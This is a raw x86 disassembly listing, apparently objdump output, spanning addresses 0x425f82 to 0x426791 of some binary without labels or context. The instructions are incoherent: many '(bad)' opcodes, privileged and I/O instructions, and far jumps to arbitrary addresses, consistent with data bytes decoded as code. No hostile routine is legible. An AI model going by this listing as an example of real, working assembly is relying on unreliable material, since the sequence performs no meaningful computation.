  425f82:	xor    al,0xec
  425f84:	(bad)  
  425f86:	addr16 ja 0x425f16
  425f89:	dec    ebp
  425f8a:	int    0xab
  425f8c:	push   eax
  425f8d:	or     al,0xfc
  425f8f:	int    0x9b
  425f91:	aaa    
  425f92:	mov    bl,0xa7
  425f94:	mov    DWORD PTR [edx-0x46],ebp
  425f97:	pop    fs
  425f99:	pop    edx
  425f9a:	dec    esi
  425f9b:	(bad)
  425fa0:	mov    esp,0x4d82918c
  425fa5:	aam    0x2b
  425fa7:	xor    BYTE PTR [edx+0x49d2c0d4],bh
  425fad:	dec    ecx
  425fae:	pop    edx
  425faf:	ret    0x3770
  425fb2:	lea    ecx,[eax+0x2cec9394]
  425fb8:	adc    DWORD PTR [ebx+0x36f09ef0],ecx
  425fbe:	add    DWORD PTR ds:0x2748d73,0xaa88ce9
  425fc8:	pusha  
  425fc9:	aaa    
  425fca:	xor    DWORD PTR [esp+ebx*4-0x26b80d51],ecx
  425fd1:	mov    ch,BYTE PTR [eax+0x6ecdbe9a]
  425fd7:	test   BYTE PTR [ebp+0x2],cl
  425fdd:	add    BYTE PTR [eax],al
  425fdf:	jne    0x425fe3
  425fe1:	pop    esi
  425fe2:	dec    edi
  425fe3:	sbb    DWORD PTR [edx+0x6fb9c3c],ecx
  425fe9:	clc    
  425fea:	mov    ebp,DWORD PTR [eax+0x6d4f0f95]
  425ff0:	add    eax,0x275e165
  425ff5:	jmp    0xa2d80588
  425ffa:	inc    esi
  425ffb:	adc    eax,0x7503e904
  426000:	mov    DWORD PTR [ecx+0x23ee31dc],edi
  426006:	ds cli 
  426008:	pop    ss
  426009:	lea    ecx,[edx+0x3e5e8e58]
  42600f:	leave  
  426010:	mov    DWORD PTR [esp+ebx*4],ecx
  426013:	lea    eax,[esi]
  426015:	mov    esi,0x9a893716
  42601a:	fcomp  QWORD PTR [ecx]
  42601c:	repnz push ebx
  42601f:	test   BYTE PTR [ebp+0x5d],bh
  426022:	jne    0x425ff2
  426024:	or     DWORD PTR [edi],esi
  426026:	fsubr  QWORD PTR [ecx+eax*2+0x37]
  42602a:	fsub   QWORD PTR [esi-0x4e5911e7]
  426030:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426031:	jne    0x42601a
  426033:	call   DWORD PTR [edi]
  426035:	call   0x37d4c3aa
  42603a:	mov    esp,0x5fff17e6
  42603f:	xchg   ebx,eax
  426040:	xchg   edx,eax
  426041:	jg     0x425fef
  426043:	add    BYTE PTR [eax],al
  426045:	add    BYTE PTR [eax],al
  426047:	add    BYTE PTR [esi],dl
  426049:	add    bh,BYTE PTR [edx-0xf]
  42604c:	inc    ecx
  42604d:	push   ss
  42604e:	call   0xe716d1f0
  426053:	in     eax,dx
  426054:	stc    
  426055:	push   ds
  426056:	loopne 0x426041
  426058:	stc    
  426059:	push   ss
  42605a:	adc    al,ch
  42605c:	arpl   WORD PTR [esi-0x119c3dbe],cx
  426062:	jnp    0x4260aa
  426064:	add    DWORD PTR [edi],edx
  426066:	in     al,0x62
  426068:	mov    ebx,0x13427aa
  42606d:	(bad)  
  42606f:	sub    BYTE PTR [edi-0x132aa75],dh
  426075:	lock add cl,BYTE PTR cs:[edx+ebx*4-0x79]
  42607b:	and    al,0xcd
  42607d:	fsub   st(7),st
  42607f:	out    dx,al
  426080:	mov    edi,DWORD PTR [ebx-0x51739fc2]
  426086:	or     edi,DWORD PTR [esi+0x7]
  426089:	int    0xd9
  42608b:	daa    
  42608c:	jno    0x42610b
  42608e:	pop    ebp
  42608f:	test   eax,ebp
  426091:	inc    esi
  426092:	loopne 0x426016
  426094:	jnp    0x426113
  426096:	pop    ebp
  426097:	mov    ch,0xf8
  426099:	cs loopne 0x42609c
  42609c:	dec    esp
  42609d:	jecxz  0x4260ba
  42609f:	add    BYTE PTR [ecx+0x45],cl
  4260a2:	cli    
  4260a3:	je     0x426044
  4260a5:	jno    0x4260ee
  4260a7:	add    edx,DWORD PTR [edi]
  4260a9:	fisttp DWORD PTR [edi]
  4260ab:	sldt   WORD PTR [eax]
  4260ae:	add    BYTE PTR [eax],al
  4260b0:	add    BYTE PTR [ebx],cl
  4260b2:	fist   DWORD PTR [ebx]
  4260b4:	cmp    esp,DWORD PTR [esi+0x5]
  4260b7:	xchg   DWORD PTR [esi-0xffff64],esi
  4260bd:	rcr    DWORD PTR [eax-0x80],1
  4260c0:	jge    0x42605a
  4260c2:	add    BYTE PTR [ebx-0x106778b],al
  4260c8:	mov    DWORD PTR [ecx],ebx
  4260ca:	jne    0x426054
  4260cc:	or     al,0x63
  4260ce:	cmp    eax,0xbe944d82
  4260d3:	loope  0x4260d9
  4260d5:	enterw 0xc88,0x33
  4260da:	mov    cl,BYTE PTR [ebp-0x20]
  4260dd:	jp     0x4260a4
  4260df:	shl    cl,0x50
  4260e2:	jae    0x42612f
  4260e4:	inc    DWORD PTR [esi-0x36]
  4260e7:	sti    
  4260e8:	xlat   BYTE PTR ds:[ebx]
  4260e9:	xchg   esp,eax
  4260ea:	xor    ch,BYTE PTR [edi]
  4260ec:	add    DWORD PTR [edi-0x66770545],ebx
  4260f2:	push   0xffffff89
  4260f4:	inc    ebp
  4260f5:	inc    eax
  4260f6:	xchg   DWORD PTR [ebp-0x30],ebx
  4260f9:	addr16 mov edi,0xda97437d
  4260ff:	fisttp WORD PTR [ebx-0x2f0489b7]
  426105:	test   edx,ebx
  426107:	ror    DWORD PTR [ebx+0x5589c291],cl
  42610d:	mov    esp,0xa98b1268
  426112:	jbe    0x4260f7
  426114:	adc    eax,0x0
  426119:	add    BYTE PTR [edi-0x1e],cl
  42611c:	repz push DWORD PTR [ebp-0xb]
  426120:	test   DWORD PTR [esi+0x75868920],0x18400f6d
  42612a:	jbe    0x4261a6
  42612c:	xchg   DWORD PTR [edi+eiz*2],ebx
  42612f:	jmp    0x87a5:0xa5c14cd6
  426136:	xor    BYTE PTR [ecx-0x555eba66],bl
  42613c:	push   eax
  42613d:	loopne 0x42613d
  42613f:	pop    esi
  426140:	xchg   ebx,eax
  426141:	aaa    
  426142:	cmp    cl,bl
  426144:	sbb    dl,al
  426146:	and    BYTE PTR [esi-0x69],0x87
  42614a:	sub    BYTE PTR [ecx-0x6392b324],bh
  426150:	mov    ebx,DWORD PTR [edx+0x2f99e46b]
  426156:	inc    edi
  426157:	stos   BYTE PTR es:[edi],al
  426158:	push   eax
  426159:	fdiv   QWORD PTR [esi+eiz*2-0x55]
  42615d:	inc    eax
  42615e:	mov    fs,WORD PTR [esi-0xd]
  426161:	or     bh,cl
  426163:	sbb    BYTE PTR [ebp+0x481042fb],0xc
  42616a:	out    dx,eax
  42616b:	gs mov bh,0x88
  42616e:	jge    0x426190
  426170:	ret    0xcb5b
  426173:	jo     0x426141
  426175:	mov    esi,0xbfd0a97d
  42617a:	push   cs
  42617b:	scas   al,BYTE PTR es:[edi]
  42617c:	xor    eax,DWORD PTR [edi+0x0]
  426182:	add    BYTE PTR [ecx],ah
  426184:	sub    BYTE PTR [eax+0xbf5fe48],dh
  42618a:	xchg   DWORD PTR [ebp+ebx*4-0x1a13accb],ebp
  426191:	xchg   ebx,eax
  426192:	xchg   DWORD PTR [eax-0x4b],eax
  426195:	mov    dh,dh
  426197:	(bad)  
  426198:	in     eax,dx
  426199:	repz (bad) 
  42619b:	mov    edx,0x8a99e601
  4261a0:	mov    WORD PTR [ebx-0x54fe2fb9],fs
  4261a6:	inc    edi
  4261a7:	iret   
  4261a8:	add    DWORD PTR [eax+0x4f],esp
  4261ab:	std    
  4261ac:	mov    BYTE PTR [esp+eax*8],al
  4261af:	in     al,dx
  4261b0:	cmp    al,0x91
  4261b2:	fnstenv [ebp+0x745a6402]
  4261b8:	add    ch,cl
  4261ba:	call   0x4fb29079
  4261bf:	test   eax,0x2888e6a6
  4261c4:	repnz pop ebp
  4261c6:	inc    edi
  4261c7:	mov    ch,0x88
  4261c9:	mov    ah,0xaf
  4261cb:	dec    edx
  4261cc:	mov    dl,0xf2
  4261ce:	mov    gs,ecx
  4261d0:	add    cl,ch
  4261d2:	add    ebx,DWORD PTR [edx+0x454760c4]
  4261d8:	sahf   
  4261d9:	out    0x88,al
  4261db:	mov    eax,0xbdf38fb2
  4261e0:	jnp    0x42618e
  4261e2:	xchg   edi,eax
  4261e3:	cld    
  4261e4:	aas    
  4261e5:	xor    eax,0xd9
  4261ea:	add    BYTE PTR [eax],al
  4261ec:	xor    eax,0xb88ae610
  4261f1:	xchg   esi,eax
  4261f2:	outs   dx,BYTE PTR ds:[esi]
  4261f3:	inc    edi
  4261f4:	sub    esi,ecx
  4261f6:	daa    
  4261f7:	pop    ds
  4261f8:	xor    bh,BYTE PTR [ebx-0x54]
  4261fb:	mov    edi,0xd0d2ff2
  426200:	out    0x3f,al
  426202:	ror    DWORD PTR [esi+eiz*8],1
  426205:	aaa    
  426206:	int    0x88
  426208:	nop
  426209:	cli    
  42620a:	xor    eax,0xca96809d
  42620f:	push   ss
  426210:	add    eax,0xfe9fac9b
  426215:	xchg   ecx,eax
  426216:	jmp    0x3b62:0x96506c
  42621d:	inc    BYTE PTR [esi+0x65120924]
  426223:	lea    esi,[esi+0x11]
  426226:	mov    DWORD PTR gs:[esi+0x7f],esi
  42622a:	cmp    al,0xe7
  42622c:	xor    ah,al
  42622e:	add    ebp,ecx
  426230:	out    dx,eax
  426231:	pop    ss
  426232:	mov    esp,0x89aa7b70
  426237:	and    al,0xc1
  426239:	les    eax,FWORD PTR [ebp+0x76]
  42623c:	jbe    0x426202
  42623e:	inc    ebp
  42623f:	(bad)  
  426240:	jbe    0x426206
  426242:	inc    ebp
  426243:	cmp    eax,0x5d45c477
  426248:	ja     0x4261d1
  42624a:	xlat   BYTE PTR ds:[ebx]
  42624b:	xlat   BYTE PTR ds:[ebx]
  42624c:	inc    esp
  42624d:	adc    DWORD PTR [ebp+0x45],edi
  426250:	add    BYTE PTR [eax],al
  426252:	add    BYTE PTR [eax],al
  426254:	add    BYTE PTR [esi+0x17],dh
  426257:	add    eax,0x55898673
  42625c:	ds cld 
  42625e:	add    DWORD PTR [esi],esi
  426260:	lods   al,BYTE PTR ds:[esi]
  426261:	or     DWORD PTR [edi],edx
  426263:	add    eax,0xe7a6bb2e
  426268:	cld    
  426269:	cmc    
  42626a:	push   cs
  42626b:	loopne 0x426256
  42626d:	imul   eax,DWORD PTR ds:0x1eaacc2,0xffffff88
  426274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426275:	dec    ecx
  426276:	xlat   BYTE PTR ds:[ebx]
  426277:	inc    esp
  426278:	fisub  WORD PTR [ebx-0x9]
  42627b:	cli    
  42627c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42627d:	(bad)  
  42627e:	mov    BYTE PTR [ebp+0x21],al
  426281:	or     DWORD PTR [edi],edi
  426283:	fsubr  DWORD PTR [ecx-0x1627f10b]
  426289:	jmp    0x35a12ad4
  42628e:	test   eax,0xb6b4af04
  426293:	add    BYTE PTR [edx-0x4c],ah
  426296:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426297:	aaa    
  426298:	add    BYTE PTR [ecx+0x66],cl
  42629b:	outs   dx,BYTE PTR ds:[esi]
  42629c:	or     BYTE PTR [esi+0x43],ah
  42629f:	test   DWORD PTR [edx+0x6e29589],0x8a0f4356
  4262a9:	cdq    
  4262aa:	ins    DWORD PTR es:[edi],dx
  4262ab:	cmp    BYTE PTR [ebp-0xf],0x5
  4262af:	mov    BYTE PTR [ebp-0x35],dl
  4262b2:	add    BYTE PTR ds:0x74c2993a,al
  4262b8:	push   cs
  4262b9:	add    BYTE PTR [eax],al
  4262bb:	add    BYTE PTR [eax],al
  4262bd:	add    BYTE PTR [ebp+edi*8-0x7],cl
  4262c1:	xchg   DWORD PTR [eax+0x2145bdfa],ebx
  4262c7:	pop    es
  4262c8:	mov    BYTE PTR [ebp-0x28],al
  4262cb:	inc    ebx
  4262cc:	cmp    BYTE PTR [ebp+0x10],0x6
  4262d0:	pop    es
  4262d1:	test   DWORD PTR [edx],ebx
  4262d3:	push   es
  4262d4:	add    BYTE PTR [eax],al
  4262d6:	sbb    al,0xfd
  4262d8:	pop    es
  4262d9:	xor    BYTE PTR [ecx-0x7475ffa0],0x0
  4262e0:	pop    ss
  4262e1:	xor    BYTE PTR [ecx],0x6a
  4262e4:	add    BYTE PTR [edx+0x56f9509],cl
  4262ea:	shl    dx,cl
  4262ed:	je     0x426364
  4262ef:	cli    
  4262f0:	add    ecx,DWORD PTR [eax+0xe147c5b]
  4262f6:	call   0xf2d1:0xd401f641
  4262fd:	inc    esi
  4262fe:	dec    BYTE PTR [bp+di]
  426301:	adc    BYTE PTR [edx+0x41],bl
  426304:	test   BYTE PTR [eax],0x94
  426307:	add    esi,edi
  426309:	jne    0x426293
  42630b:	jns    0x426311
  42630d:	push   cs
  42630e:	adc    esi,ebx
  426310:	ret    
  426311:	jmp    FWORD PTR [ecx+0x7575f74a]
  426317:	lods   eax,DWORD PTR ds:[esi]
  426318:	das    
  426319:	sti    
  42631a:	mov    BYTE PTR [ecx-0x37065559],ch
  426320:	xchg   esi,eax
  426321:	inc    DWORD PTR [eax]
  426323:	add    BYTE PTR [eax],al
  426325:	add    BYTE PTR [eax],al
  426327:	loop   0x42634f
  426329:	mov    edi,0x1058a375
  42632e:	fdiv   QWORD PTR [edx+0x18]
  426331:	dec    eax
  426332:	call   0xbd25211
  426337:	or     dl,bh
  426339:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42633a:	sti    
  42633b:	inc    eax
  42633c:	imul   ecx,DWORD PTR [edx-0x197fe8b],0xc06ee00
  426346:	mov    BYTE PTR [eax],bh
  426348:	push   cs
  426349:	xchg   DWORD PTR [ebp-0x55],eax
  42634c:	xor    DWORD PTR [ebx-0x9],0x458a20a2
  426353:	imul   ecx,DWORD PTR [esi+edx*4+0x75],0x50c19c85
  42635b:	popf   
  42635c:	mov    bh,0x39
  42635e:	cli    
  42635f:	sbb    BYTE PTR [edx+edx*4-0x10cacf81],0x86
  426367:	mov    eax,0x456d823d
  42636c:	test   eax,0xb03544da
  426371:	xor    DWORD PTR [edi+0x5b],0xffffffe8
  426375:	xchg   ebp,eax
  426376:	jg     0x426330
  426378:	icebp  
  426379:	out    dx,al
  42637a:	xchg   BYTE PTR [eax+0x316d8201],dh
  426380:	mov    edx,ebx
  426382:	inc    esp
  426383:	std    
  426384:	xchg   edi,eax
  426385:	or     DWORD PTR [ebx+0x33],0xffffff90
  426389:	cdq    
  42638a:	push   edi
  42638b:	add    BYTE PTR [eax],al
  42638d:	add    BYTE PTR [eax],al
  42638f:	add    dl,cl
  426391:	and    al,0xc1
  426393:	pop    edx
  426394:	sub    al,0xdb
  426396:	out    dx,al
  426397:	inc    ecx
  426399:	add    ch,BYTE PTR [esi-0x58]
  42639c:	xchg   edx,eax
  42639d:	sahf   
  42639e:	or     eax,0x1637a735
  4263a3:	mov    dh,0x52
  4263a5:	(bad)  
  4263a6:	and    dl,ch
  4263a8:	mov    edx,0xfca81c78
  4263ad:	xor    al,0xb5
  4263af:	mov    eax,DWORD PTR [eax-0x52]
  4263b2:	pusha  
  4263b3:	pop    ss
  4263b4:	int    0xc8
  4263b6:	adc    esi,eax
  4263b8:	outs   dx,DWORD PTR ds:[esi]
  4263b9:	or     BYTE PTR [edx+0x3],0x75
  4263bd:	add    ch,BYTE PTR [esi+0x47]
  4263c0:	jge    0x42643b
  4263c2:	cmp    al,0xa4
  4263c4:	in     al,dx
  4263c5:	cmp    al,0x99
  4263c7:	lea    ebp,[eax]
  4263c9:	repnz outs dx,DWORD PTR ds:[esi]
  4263cb:	das    
  4263cc:	mov    cl,0xca
  4263ce:	scas   al,BYTE PTR es:[edi]
  4263cf:	or     edi,edi
  4263d1:	psubsb mm0,QWORD PTR [ebx]
  4263d4:	jne    0x426451
  4263d6:	sbb    al,0x98
  4263d8:	repnz xor al,0x59
  4263db:	add    eax,0xbbac78bc
  4263e0:	jle    0x426439
  4263e2:	in     eax,0xd
  4263e4:	pop    ss
  4263e5:	retf   
  4263e6:	fwait
  4263e7:	sti    
  4263e8:	outs   dx,DWORD PTR ds:[esi]
  4263e9:	xchg   BYTE PTR [ebp+0x6e027502],bl
  4263ef:	mov    ebx,0x871d2ffc
  4263f4:	add    BYTE PTR [eax],al
  4263f6:	add    BYTE PTR [eax],al
  4263f8:	add    ch,al
  4263fa:	lea    esp,[edx]
  4263fc:	aas    
  4263fd:	push   ecx
  4263fe:	add    al,0xe9
  426400:	add    esi,DWORD PTR [ebp+0x79]
  426403:	sbb    ebp,ebx
  426405:	mov    cl,0xf6
  426407:	xchg   ebx,eax
  426408:	and    bh,dl
  42640a:	aas    
  42640b:	sbb    DWORD PTR [ebx+0x476e8aa8],ecx
  426411:	dec    ebp
  426412:	jp     0x426490
  426414:	fwait
  426415:	xchg   edi,eax
  426416:	retf   
  426417:	call   esp
  426419:	ins    DWORD PTR es:[edi],dx
  42641a:	pop    ss
  42641b:	dec    esp
  42641c:	bound  eax,QWORD PTR [edx+0x31b6878e]
  426422:	aas    
  426423:	adc    BYTE PTR [esp+edi*2-0x7b],bl
  426427:	dec    ebp
  426428:	rcl    DWORD PTR [ebx+ecx*8+0x1b],1
  42642c:	push   eax
  42642d:	push   0x0
  42642f:	inc    ebx
  426430:	add    cl,BYTE PTR [edx+0x3db87bf2]
  426436:	aad    0xef
  426438:	cmp    al,0x77
  42643a:	jnp    0x4264b9
  42643c:	mov    ebp,0xe2f40fef
  426441:	imul   edx,DWORD PTR [esi+0xfffea7d],0xfffffff4
  426448:	push   0x6b
  42644a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42644b:	add    BYTE PTR [edi],cl
  42644d:	imul   edx,ebp,0x8d8a957c
  426453:	inc    ecx
  426454:	xchg   edx,eax
  426455:	stos   BYTE PTR es:[edi],al
  426456:	or     al,0x65
  426458:	lea    esi,[esi-0x7b]
  42645b:	dec    ebp
  42645c:	fld    DWORD PTR [eax]
  42645e:	add    BYTE PTR [eax],al
  426460:	add    BYTE PTR [eax],al
  426462:	jno    0x42641f
  426464:	add    DWORD PTR [esi+ebp*8-0x652bc8c0],esi
  42646b:	or     DWORD PTR [eax-0x7865949e],ebp
  426471:	pushf  
  426472:	shl    ch,cl
  426474:	dec    esp
  426475:	inc    ebp
  426476:	popa   
  426477:	mov    ebp,0x36ffab41
  42647c:	call   0x27d8f7e3
  426481:	xchg   esp,eax
  426482:	add    al,BYTE PTR [ebp-0x629eeea3]
  426488:	or     ecx,DWORD PTR [esi+0xf]
  42648b:	int3   
  42648c:	mov    BYTE PTR [esi+edi*8+0x191baaf8],bl
  426493:	stos   DWORD PTR es:[edi],eax
  426494:	jp     0x426496
  426496:	and    al,0x7e
  426498:	pop    ebp
  426499:	call   0xec26a943
  42649e:	adc    bh,BYTE PTR [esi+0x5d]
  4264a1:	fcom   DWORD PTR [ebp-0x667f1c24]
  4264a7:	mov    bh,bl
  4264a9:	mov    WORD PTR [ebx+0x0],ds
  4264ac:	jne    0x4264b1
  4264ae:	cdq    
  4264af:	inc    ebp
  4264b0:	add    al,0x8b
  4264b2:	inc    ecx
  4264b3:	xchg   esi,eax
  4264b4:	push   es
  4264b5:	scas   eax,DWORD PTR es:[edi]
  4264b6:	xchg   ecx,eax
  4264b7:	xchg   edx,eax
  4264b8:	cli    
  4264b9:	shl    DWORD PTR [edi-0x48],1
  4264bc:	pop    es
  4264bd:	(bad)  
  4264be:	or     al,0x6
  4264c0:	add    BYTE PTR [eax],al
  4264c2:	or     eax,DWORD PTR [ebx-0x24]
  4264c5:	add    BYTE PTR [eax],0x0
  4264c8:	add    BYTE PTR [eax],al
  4264ca:	add    BYTE PTR [ecx+0x618afb8a],bl
  4264d0:	cli    
  4264d1:	je     0x4264e0
  4264d3:	push   edi
  4264d4:	cmp    edx,esp
  4264d6:	mov    BYTE PTR [eax-0xc937c45],bl
  4264dc:	add    eax,0x7a9ec77b
  4264e1:	dec    ebp
  4264e2:	cld    
  4264e3:	int3   
  4264e4:	data16 add al,0xa
  4264e7:	aam    0x7d
  4264e9:	or     al,0x37
  4264eb:	push   es
  4264ec:	cmp    esp,esp
  4264ee:	inc    BYTE PTR [ebp-0x3a]
  4264f1:	loope  0x4264f7
  4264f3:	sbb    ecx,edx
  4264f5:	test   BYTE PTR [edx],0x56
  4264f8:	add    eax,ebx
  4264fa:	mov    BYTE PTR [eax],ch
  4264fc:	mov    ebp,0x938300
  426501:	mov    DWORD PTR [ebp-0x4c],edi
  426504:	jge    0x42654b
  426506:	clc    
  426507:	aad    0xc9
  426509:	sar    DWORD PTR [ebx],cl
  42650b:	lahf   
  42650c:	jmp    0x6c43f055
  426511:	or     DWORD PTR [ebp+0x75],0xfffffff5
  426515:	(bad)  
  426516:	shr    ah,1
  426518:	push   esi
  426519:	mov    bh,0x87
  42651b:	enter  0x8cf9,0x55
  42651f:	adc    ecx,esi
  426521:	test   DWORD PTR [esi+0x13a695b0],0xfb971ef6
  42652b:	mov    DWORD PTR [ebx+0x5586],ecx
  426531:	add    BYTE PTR [eax],al
  426533:	add    BYTE PTR [ecx],dl
  426535:	inc    esp
  426536:	xchg   DWORD PTR [ebp+0x5d],esi
  426539:	and    BYTE PTR [eax],bh
  42653b:	or     BYTE PTR [esi+0x4a],dh
  42653e:	sbb    eax,0x44e8a989
  426543:	aaa    
  426544:	cmp    BYTE PTR [ecx+0x13],ah
  426547:	in     al,0xee
  426549:	out    0xf3,al
  42654b:	cli    
  42654c:	xor    BYTE PTR [ecx+0x4],dl
  42654f:	dec    ebp
  426550:	fst    DWORD PTR [eax]
  426552:	dec    eax
  426553:	clc    
  426554:	mov    ds,esi
  426556:	scas   eax,DWORD PTR es:[edi]
  426557:	jl     0x42650c
  426559:	je     0x42659b
  42655b:	cld    
  42655c:	out    dx,al
  42655d:	out    dx,al
  42655e:	repz cmp BYTE PTR [eax-0x7b],al
  426562:	add    cl,BYTE PTR [ecx+esi*8+0x66fb920b]
  426569:	addr16 add al,0x4d
  42656c:	xchg   ebp,eax
  42656d:	cwde   
  42656e:	int3   
  42656f:	add    DWORD PTR [eax+0x29],eax
  426572:	aas    
  426573:	aaa    
  426574:	xor    BYTE PTR [ebp+0x33178c02],dl
  42657a:	xchg   edx,eax
  42657b:	sti    
  42657c:	out    dx,al
  42657d:	add    ax,WORD PTR [esi+0x886e5c0]
  426584:	(bad)  
  426585:	jecxz  0x4265b8
  426587:	pop    edx
  426588:	mov    esi,0x7518c0e2
  42658d:	mov    BYTE PTR [edi-0x43fdb719],bh
  426593:	mov    bl,BYTE PTR [ecx+0x7f]
  426596:	or     eax,0x33
  42659b:	add    BYTE PTR [eax],al
  42659d:	cli    
  42659e:	cmp    al,0xe1
  4265a0:	mov    ch,BYTE PTR [esi+ebp*8+0x3cfc2eb2]
  4265a7:	std    
  4265a8:	mov    DWORD PTR [eax-0x566920a],edi
  4265ae:	xor    al,0xd9
  4265b0:	add    ch,BYTE PTR ds:0x4d1eeff
  4265b6:	les    ebp,FWORD PTR [esi+edx*4]
  4265b9:	jne    0x42657f
  4265bb:	and    al,0x95
  4265bd:	jne    0x426638
  4265bf:	and    al,0x54
  4265c1:	in     al,dx
  4265c2:	or     al,0x8d
  4265c4:	mov    edi,DWORD PTR [eax]
  4265c6:	sahf   
  4265c7:	inc    dl
  4265c9:	jle    0x426648
  4265cb:	ret    0x7503
  4265ce:	add    bh,dh
  4265d0:	retf   
  4265d1:	sub    bh,BYTE PTR [ecx+0x1c]
  4265d4:	int3   
  4265d5:	(bad)  
  4265d7:	ins    DWORD PTR es:[edi],dx
  4265d8:	das    
  4265d9:	gs ja  0x426600
  4265dc:	pop    eax
  4265dd:	in     al,dx
  4265de:	xor    al,0x99
  4265e0:	fldcw  WORD PTR [edx+0x745b5bfa]
  4265e6:	add    ch,cl
  4265e8:	call   0xc866ded5
  4265ed:	call   0xd917:0xa93f5dfe
  4265f4:	cmp    bh,ah
  4265f6:	cmp    al,0x61
  4265f8:	mov    edi,DWORD PTR [eax]
  4265fa:	stos   BYTE PTR es:[edi],al
  4265fb:	push   ds
  4265fc:	ret    
  4265fd:	add    bh,bh
  4265ff:	pop    edi
  426600:	aas    
  426601:	add    BYTE PTR [eax],al
  426603:	add    BYTE PTR [eax],al
  426605:	add    BYTE PTR [ebp+0x76],bh
  426608:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426609:	retf   
  42660a:	stos   BYTE PTR es:[edi],al
  42660b:	ret    
  42660c:	les    eax,FWORD PTR [eax]
  42660e:	cld    
  42660f:	aas    
  426610:	and    DWORD PTR [ecx-0x19ff5540],ecx
  426616:	test   eax,0xc1deec37
  42661b:	das    
  42661c:	lock jb 0x426681
  42661f:	cli    
  426620:	dec    esi
  426621:	push   ds
  426622:	jb     0x4265ae
  426624:	sti    
  426625:	pushf  
  426626:	jmp    0xb8e:0x811e69a
  42662d:	push   esi
  42662e:	bound  ecx,QWORD PTR [edx-0x7e855379]
  426634:	inc    ebp
  426635:	std    
  426636:	cmc    
  426637:	pop    ds
  426638:	fsub   st(1),st
  42663a:	cmc    
  42663b:	pop    ds
  42663c:	loopne 0x426627
  42663e:	cmc    
  42663f:	pop    ds
  426640:	call   0xe4625c2e
  426645:	jmp    0x274c2d3d
  42664a:	xor    eax,DWORD PTR [esi]
  42664c:	add    BYTE PTR [eax+0x7b],dh
  42664f:	dec    esi
  426650:	mov    DWORD PTR [eiz*1+0x18ad457c],ebx
  426657:	inc    eax
  426658:	shr    al,1
  42665a:	adc    BYTE PTR [eax+0x13],al
  42665d:	call   0x3dbd17ad
  426662:	hlt    
  426663:	pop    es
  426664:	call   0xb46d252
  426669:	push   esi
  42666a:	add    BYTE PTR [eax],al
  42666c:	add    BYTE PTR [eax],al
  42666e:	add    BYTE PTR [esi+0x71a5557a],ah
  426674:	push   ebp
  426675:	add    BYTE PTR [edi],al
  426677:	mov    esp,0x9bfcdc3e
  42667c:	mov    WORD PTR [ebp-0x7f],es
  42667f:	fucomp st(2)
  426681:	jle    0x426667
  426683:	jmp    0xc2b2:0xedf07502
  42668a:	lods   al,BYTE PTR ds:[esi]
  42668b:	mov    DWORD PTR [ecx+0x2416b488],ecx
  426691:	aaa    
  426692:	add    BYTE PTR [ecx],bl
  426694:	gs jne 0x4266ae
  426697:	mov    ds:0x98be3c8,eax
  42669c:	dec    ecx
  42669d:	test   DWORD PTR [ebp+0x68],0xdf02c082
  4266a4:	lock rol DWORD PTR [eax],cl
  4266a7:	(bad)
  4266aa:	jg     0x42664c
  4266ac:	pop    edx
  4266ad:	add    al,0xc6
  4266af:	fst    DWORD PTR [eax+eax*1-0x75]
  4266b3:	fstp   DWORD PTR [ebx+esi*1+0x45]
  4266b7:	js     0x4266b0
  4266b9:	add    DWORD PTR [edi],ecx
  4266bb:	pop    ebx
  4266bc:	enter  0xfdb,0x4b
  4266c0:	fcomp  st(7)
  4266c2:	jmp    0x4266c8
  4266c4:	add    al,0xaf
  4266c6:	inc    ebp
  4266c7:	sub    al,0x5
  4266c9:	scas   eax,DWORD PTR es:[edi]
  4266ca:	push   ebp
  4266cb:	sar    BYTE PTR [ebp+0x7d],0xfe
  4266cf:	fadd   QWORD PTR ds:0xdc55
  4266d5:	add    BYTE PTR [eax],al
  4266d7:	add    BYTE PTR [eax-0x66c4a204],ch
  4266dd:	mov    esi,0x54c1a74
  4266e2:	cli    
  4266e3:	xchg   eax,ebx
  4266e5:	add    al,BYTE PTR [edi]
  4266e7:	mov    bh,0xc
  4266e9:	mov    edi,0x3a4408e8
  4266ee:	push   es
  4266ef:	add    DWORD PTR [edx],ecx
  4266f1:	cmp    esi,esi
  4266f3:	add    DWORD PTR ds:0xda83bfcb,edx
  4266f9:	(bad)  
  4266fa:	jg     0x426779
  4266fc:	retf   
  4266fd:	add    al,0x7
  4266ff:	test   DWORD PTR [esi-0x2],eax
  426702:	(bad)  
  426703:	call   FWORD PTR [eax*1+0x54918008]
  42670a:	add    BYTE PTR [edx-0x7fcf0f65],cl
  426710:	jne    0x4266c0
  426712:	mov    es,WORD PTR [eax]
  426714:	jmp    0xc0c990bc
  426719:	frstor ds:0x1881c837
  42671f:	sub    DWORD PTR [edx+0x8],ebp
  426722:	cmp    esp,ebx
  426724:	sbb    DWORD PTR [ebp+0x56fe0377],0x977988ab
  42672e:	(bad)  
  42672f:	call   0xa8a88a1
  426734:	je     0x426715
  426736:	dec    eax
  426737:	sti    
  426738:	je     0x42674c
  42673a:	cmp    DWORD PTR [eax+0x0],edi
  426740:	add    dh,dh
  426742:	fild   WORD PTR [ecx]
  426744:	out    0x6d,eax
  426746:	popf   
  426747:	out    dx,eax
  426748:	sar    DWORD PTR [eax+0x7287ff98],0xa0
  42674f:	sbb    al,dl
  426751:	lock popf 
  426753:	add    ebx,edi
  426755:	sbb    BYTE PTR [ecx-0x72],0x75
  426759:	int    0xb8
  42675b:	sbb    al,bh
  42675d:	inc    ebp
  42675e:	rcr    BYTE PTR [eax],0xf4
  426761:	int    0x40
  426763:	nop
  426764:	sti    
  426765:	ficomp DWORD PTR [edi+ecx*4-0x34314a7b]
  42676c:	cli    
  42676d:	inc    eax
  42676e:	sar    esi,0xb2
  426771:	xor    BYTE PTR [ebp-0x72],dh
  426774:	jne    0x426733
  426776:	mov    al,ds:0x78a55556
  42677b:	sbb    ah,dh
  42677d:	inc    BYTE PTR [esi-0x65853dad]
  426783:	jp     0x426802
  426785:	ins    DWORD PTR es:[edi],dx
  426786:	and    DWORD PTR [eax-0x6],ecx
  426789:	std    
  42678a:	fimul  WORD PTR [esi+0x5a02e3e8]
  426790:	xchg   edx,eax
  426791:	jle    0x42680e
